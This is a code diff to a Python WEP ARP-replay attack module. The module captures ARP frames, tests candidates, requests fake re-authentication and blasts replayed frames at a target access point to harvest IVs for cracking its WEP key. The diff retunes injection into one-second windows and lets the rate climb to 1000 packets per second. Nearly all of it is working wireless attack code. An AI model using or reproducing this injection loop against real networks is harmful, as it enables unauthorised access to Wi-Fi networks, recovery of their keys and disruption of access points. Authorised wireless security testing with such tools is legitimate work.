@@ -16,8 +16,12 @@ trial; only sustained zero-yield blacklists it. Once one yields, we lock on
 and keep replaying it. If a locked winner stalls (likely we got de-associated)
 we ask fake-auth to re-auth and keep the same seed rather than discarding it.
 
-Operating shape: short TX bursts separated by RX windows, with a hill-climb
-that nudges burst size toward the best IV yield.
+Operating shape (deliberately SIMPLE): fixed 1-second windows. Each window we
+blast ``rate`` packets at the card's full speed, then sleep out the rest of the
+second (one ~1s sleep — immune to Windows' ~15ms timer granularity, unlike
+per-frame pacing) while the AP's rebroadcasts land. Count IVs gained that
+second, then a perturb-and-observe step nudges ``rate`` toward more IVs/s. No
+per-cycle pacing math, no idle-heavy small bursts capping the duty cycle.
 """
 
 from __future__ import annotations
@@ -53,33 +57,26 @@ class ArpReplayStats:
 
 
 class WepArpReplay:
-    """ARP-replay loop with patient candidate testing + P&O rate control.
+    """ARP-replay loop with patient candidate testing + per-second P&O rate.
 
-    Injection rate is tuned by **perturb-and-observe** (the solar-MPPT
-    algorithm) to MAXIMIZE IVs/s — the real objective — rather than maximizing
-    pps or capture%. Hardware showed a single interior optimum (~80-120 pps on
-    the dd-wrt box): below it we under-drive the AP, above it we overflow its
-    rebroadcast queue + starve our half-duplex RX, so IVs/s falls on BOTH sides.
-    P&O finds + hovers at that peak on whatever AP it's pointed at: step the
-    rate, wait LONGER than the AP's relay delay (~1-2s), measure IVs/s, keep the
-    step's direction if IVs/s improved else reverse. (The old climber failed
-    because it hill-climbed burst size on PER-CYCLE gain — a window shorter than
-    the relay delay, so it climbed on misattributed noise to max burst.)
+    Each 1-second window injects ``rate`` packets (one big burst at the card's
+    full speed), then waits out the second. A **perturb-and-observe** step on
+    ``rate`` maximizes the real objective — IVs/s (≈ IVs captured per window) —
+    by stepping the rate, observing whether IVs/s rose or fell, and reversing on
+    a drop. Simple, and it lets the rate climb freely toward whatever the AP can
+    actually sustain (we make NO assumption about a low ceiling).
     """
 
-    # P&O rate controller. Control var = injection pps; objective = IVs/s
-    # measured over a DWELL that exceeds the AP relay delay (so a step's IVs have
-    # landed before we judge it). Start near the observed optimum to converge
-    # fast; bounds keep the search sane.
-    _PO_DWELL_S = 8.0
+    # P&O rate controller over 1s windows. Control var = pps (= packets/window);
+    # objective = IVs gained that second.
+    _WINDOW_S = 1.0
     _PO_STEP_PPS = 32.0
-    _PO_START_PPS = 96.0
-    _PO_MIN_PPS = 24.0
-    _PO_MAX_PPS = 500.0
-    # Relative improvement deadband — only reverse on a real drop, so per-dwell
-    # noise doesn't cause needless thrashing at the peak.
-    _PO_IMPROVE_EPS = 0.03
-    _BURST = 16          # frames per cycle (granularity; the pace sets the rate)
+    _PO_START_PPS = 100.0
+    _PO_MIN_PPS = 20.0
+    _PO_MAX_PPS = 1000.0
+    # Relative improvement deadband — reverse only on a real drop, so window
+    # noise doesn't thrash the rate.
+    _PO_IMPROVE_EPS = 0.05
     # How long to keep testing one candidate before judging it (seconds). The
     # AP's relayed rebroadcast can lag the burst, so don't condemn on one cycle.
     _TRIAL_WINDOW = 2.5
@@ -102,7 +99,6 @@ class WepArpReplay:
         notify_activity: Optional[Callable[[], None]] = None,
         request_reauth: Optional[Callable[[], None]] = None,
         log_callback: Optional[Callable[[str], None]] = None,
-        rx_window: float = 0.15,
         heartbeat_s: float = 8.0,
     ):
         self.iface = iface
@@ -117,7 +113,6 @@ class WepArpReplay:
         self._notify_activity = notify_activity or (lambda: None)
         self._request_reauth = request_reauth or (lambda: None)
         self._log = log_callback or (lambda _m: None)
-        self.rx_window = rx_window
         self.heartbeat_s = heartbeat_s
 
         self.stats = ArpReplayStats()
@@ -127,13 +122,11 @@ class WepArpReplay:
         self._paused = False
         self._task: Optional[asyncio.Task] = None
 
-        self._burst_size = self._BURST
-        # P&O rate-controller state.
+        # P&O rate-controller state (1s windows; rate = packets/window = pps).
         self._rate = self._PO_START_PPS       # current target injection pps
         self._rate_step = self._PO_STEP_PPS   # signed perturbation
-        self._po_prev_ivs_s = -1.0            # last dwell's measured IVs/s
-        self._po_window_start = 0.0           # dwell start time
-        self._po_window_ivs0 = 0              # unique IVs at dwell start
+        self._po_prev_ivs_s = -1.0            # previous window's IVs/s
+        self._last_ivs_s = 0.0                # this window's IVs/s (set by burst)
 
         # Candidate under test/replay + its trial accounting.
         self._current: Optional[bytes] = None
@@ -165,7 +158,6 @@ class WepArpReplay:
         self._rate = self._PO_START_PPS
         self._rate_step = self._PO_STEP_PPS
         self._po_prev_ivs_s = -1.0
-        self._po_window_start = 0.0
         self._task = asyncio.create_task(self._replay_loop())
         logger.info("[WEP-ARP] Replay started on %s", self.bssid)
 
@@ -257,7 +249,7 @@ class WepArpReplay:
                     if self._current is not cand:
                         self._begin_trial(cand)
 
-                gain = await self._burst_and_measure(self._current)
+                gain = await self._burst_window(self._current)
                 self._trial_gain += gain
                 self._judge(gain)
                 self._maybe_adjust_rate()
@@ -297,7 +289,10 @@ class WepArpReplay:
         )
         return new_hdr + body
 
-    async def _burst_and_measure(self, cand: bytes) -> int:
+    async def _burst_window(self, cand: bytes) -> int:
+        """One 1-second window: blast ``rate`` packets at the card's full speed,
+        then sleep out the rest of the second while the AP's rebroadcasts land.
+        Returns IVs gained this window (≈ IVs/s, the P&O objective)."""
         frame = self._build_replay_frame(cand)
         if frame is None:
             # Malformed capture — blacklist and move on.
@@ -307,7 +302,7 @@ class WepArpReplay:
         ivs_before = self.collector.unique_count(self.bssid)
         t0 = time.time()
         sent = 0
-        for _ in range(self._burst_size):
+        for _ in range(int(round(self._rate))):
             if not self._active:
                 break
             try:
@@ -320,18 +315,18 @@ class WepArpReplay:
         send_dt = max(1e-3, time.time() - t0)   # burst only — the hardware cap
         if sent:
             self._notify_activity()   # our traffic keeps the assoc alive
-        # Pace this cycle to the P&O-chosen rate (frames/_rate), with the
-        # leftover time serving as the RX window for rebroadcasts to land;
-        # never shorter than rx_window.
-        desired_cycle = self._burst_size / max(1.0, self._rate)
-        await asyncio.sleep(max(self.rx_window, desired_cycle - send_dt))
-        cycle_dt = max(1e-3, time.time() - t0)
+        # Wait out the remainder of the 1s window (one big sleep — immune to
+        # Windows' ~15ms timer granularity). If the burst overran the second
+        # (rate beyond the card's reach), no sleep — the card's max IS our cap.
+        await asyncio.sleep(max(0.0, self._WINDOW_S - send_dt))
+        window_dt = max(1e-3, time.time() - t0)
         self.stats.cycles += 1
-        self.stats.raw_pps = sent / send_dt
-        self.stats.effective_pps = sent / cycle_dt
-        self.stats.burst_size = self._burst_size
+        self.stats.raw_pps = sent / send_dt           # card's burst speed
+        self.stats.effective_pps = sent / window_dt   # over the full window
+        self.stats.burst_size = sent
         gain = self.collector.unique_count(self.bssid) - ivs_before
         self.stats.last_gain = gain
+        self._last_ivs_s = gain / window_dt           # IVs/s this window (P&O)
         return gain
 
     def _judge(self, gain: int) -> None:
@@ -381,46 +376,27 @@ class WepArpReplay:
             self.stats.candidates_failed = len(self._failed)
             self._current = None
 
-    def _reset_po_window(self) -> None:
-        """(Re)start the P&O measurement dwell at the current IV count."""
-        self._po_window_start = time.time()
-        self._po_window_ivs0 = self.collector.unique_count(self.bssid)
-
     def _maybe_adjust_rate(self) -> None:
-        """Perturb-and-observe step on the injection rate, run once per dwell —
-        ONLY while actively replaying a winner (otherwise IVs/s isn't a clean
-        function of our rate). Measures IVs/s over the dwell (a window longer
-        than the AP's relay delay), then keeps the perturbation's direction if
-        IVs/s improved, else reverses — so the rate converges to and dithers
-        around the IVs/s peak.
+        """Perturb-and-observe step, run once per 1s window — ONLY while
+        replaying a winner (else IVs/s isn't a clean function of our rate). Keep
+        the perturbation's direction if this window's IVs/s beat the last one's,
+        else reverse; then step the rate. The rate walks toward more IVs/s and
+        dithers around the peak — wherever the AP actually tops out.
         """
         if self.state != "replaying":
-            # No steady injection to measure; hold rate + keep the window fresh.
-            self._reset_po_window()
+            self._po_prev_ivs_s = -1.0   # no steady signal → reset the baseline
             return
-        if self._po_window_start == 0.0:
-            self._reset_po_window()
-            return
-        now = time.time()
-        dwell = now - self._po_window_start
-        if dwell < self._PO_DWELL_S:
-            return
-        ivs_now = self.collector.unique_count(self.bssid)
-        measured = (ivs_now - self._po_window_ivs0) / dwell   # IVs/s this dwell
-
+        measured = self._last_ivs_s      # IVs/s captured this window
         if self._po_prev_ivs_s < 0:
-            # First measurement — no baseline yet; just record + take a step.
-            self._po_prev_ivs_s = measured
+            self._po_prev_ivs_s = measured   # first window: just set baseline
         else:
-            # Reverse only on a real drop (deadband absorbs per-dwell noise).
+            # Reverse only on a real drop (deadband absorbs window noise).
             if measured < self._po_prev_ivs_s * (1.0 - self._PO_IMPROVE_EPS):
                 self._rate_step = -self._rate_step
             self._po_prev_ivs_s = measured
-
         self._rate = min(
             self._PO_MAX_PPS, max(self._PO_MIN_PPS, self._rate + self._rate_step)
         )
-        self._reset_po_window()
 
     # ---- Logging ------------------------------------------------------------
 
